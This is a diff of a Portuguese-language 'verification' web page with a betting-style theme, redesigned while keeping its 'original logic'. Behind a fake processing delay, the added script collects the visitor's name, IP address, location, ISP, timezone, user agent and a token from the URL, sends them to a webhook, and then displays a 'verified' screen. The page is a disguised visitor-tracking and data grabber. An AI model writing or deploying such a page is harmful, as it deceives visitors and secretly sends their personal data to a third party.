+    // small delay to mimic processing
+    await new Promise(resolve => setTimeout(resolve, 1000));
+    
+    // get current timestamp
+    const now = new Date();
+    const formattedDate = now.toLocaleDateString('pt-BR') + ' ' + now.toLocaleTimeString('pt-BR');
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    
+    // prepare payload same as original
+    const payload = {
+      name: userName,
+      ip: ipInformation.ip || 'N/A',
+      country: ipInformation.country || 'N/A',
+      city: ipInformation.city || 'N/A',
+      region: ipInformation.region || 'N/A',
+      isp: ipInformation.isp || 'N/A',
+      date: formattedDate,
+      timezone: tz,
+      userAgent: navigator.userAgent,
+      token: urlToken
+    };
+    
+    // send to webhook (same as original logic)
+    await sendToWebhook(payload);
+    
+    // update verified screen data
+    verifiedUserNameSpan.innerText = userName;
+    infoIPSpan.innerText = ipInformation.ip;
+    
+    let locationString = `${ipInformation.city}`;
+    if (ipInformation.city && ipInformation.region) locationString += `, ${ipInformation.region}`;
+    if (ipInformation.country && ipInformation.country !== 'N/A') locationString += ` · ${ipInformation.country}`;
+    if (locationString === '' || locationString === 'N/A') locationString = 'Localização não disponível';
+    infoLocationSpan.innerText = locationString;
+    
+    infoDateTimeSpan.innerText = formattedDate;
+    let shortUA = shortenUA(navigator.userAgent);
+    infoAgentSpan.innerText = shortUA;
+    
+    // also fill remaining grid extra fields (but we have 4 cards already: ip, location, datetime, agent)
+    // For full consistency: ensure all ip details shown
+    
+    // switch screens with animation
+    loginDiv.classList.add('hidden-screen');
+    loginDiv.style.display = 'none';
+    verifiedDiv.classList.remove('hidden-screen');
+    verifiedDiv.style.display = 'block';
+    verifiedDiv.classList.add('active-screen');
+    
+    // reset button state
+    continueButton.innerText = originalBtnText;
+    continueButton.disabled = false;
+  }
+  
+  // event binding + enter key
+  function bindEvents() {
+    continueButton.addEventListener('click', handleVerification);
+    nameInputField.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        handleVerification();
+      }
     });
-  } catch(e){}
-
-  // Show verified screen
-  document.getElementById('login-screen').style.display='none';
-  const vs = document.getElementById('verified-screen');
-  vs.style.display='block';
-  vs.classList.add('active');
-
-  document.getElementById('displayName').textContent = name;
-  document.getElementById('displayIP').textContent = ipData.ip || 'N/A';
-  document.getElementById('displayDate').textContent = dateStr;
-  document.getElementById('displayCountry').textContent = ipData.country_name || 'N/A';
-  document.getElementById('displayCity').textContent = (ipData.city||'') + (ipData.region?', '+ipData.region:'') || 'N/A';
-}
+  }
+  
+  // init particles in background - golden & red particles (visual flair)
+  function initParticles() {
+    const particleCount = 45;
+    for (let i = 0; i < particleCount; i++) {
+      const particle = document.createElement('div');
+      particle.classList.add('particle-bet');
+      const size = Math.random() * 3 + 1.5;
+      particle.style.width = size + 'px';
+      particle.style.height = size + 'px';
+      particle.style.left = Math.random() * 100 + '%';
+      particle.style.animation = `floatParticle ${Math.random() * 12 + 7}s linear infinite`;
+      particle.style.animationDelay = Math.random() * 8 + 's';
+      particle.style.opacity = Math.random() * 0.5 + 0.2;
+      particle.style.background = Math.random() > 0.7 ? '#e11d2c' : '#facc15';
+      document.body.appendChild(particle);
+    }
+    // add keyframes dynamic
+    const styleSheet = document.createElement("style");
+    styleSheet.textContent = `
+      @keyframes floatParticle {
+        0% { transform: translateY(100vh) translateX(0px); opacity: 0; }
+        15% { opacity: 0.7; }
+        85% { opacity: 0.4; }
+        100% { transform: translateY(-10vh) translateX(${Math.random() * 40 - 20}px); opacity: 0; }
+      }
+    `;
+    document.head.appendChild(styleSheet);
+  }
+  
+  // fetching ip data before ready
+  async function startup() {
+    await retrieveIPData();
+    bindEvents();
+    initParticles();
+  }
+  
+  startup();
+  
+  // Additional style for hidden-screen class
+  const styleHidden = document.createElement('style');
+  styleHidden.textContent = `
+    .hidden-screen { display: none !important; }
+    #verifiedScreen { display: none; }
+    .card { transition: all 0.25s ease; }
+  `;
+  document.head.appendChild(styleHidden);
+  
+  // adjust final minor UI — ensure verified screen background consistency
+  // also override any leftover inline style from original (not needed, full redesign)
 </script>
 
-<style>
-@keyframes shake {
-  0%,100%{transform:translateX(0)} 25%{transform:translateX(-8px)} 75%{transform:translateX(8px)}
-}
-</style>
+<!-- small extra animation for floating cards -->
 </body>
 </html>
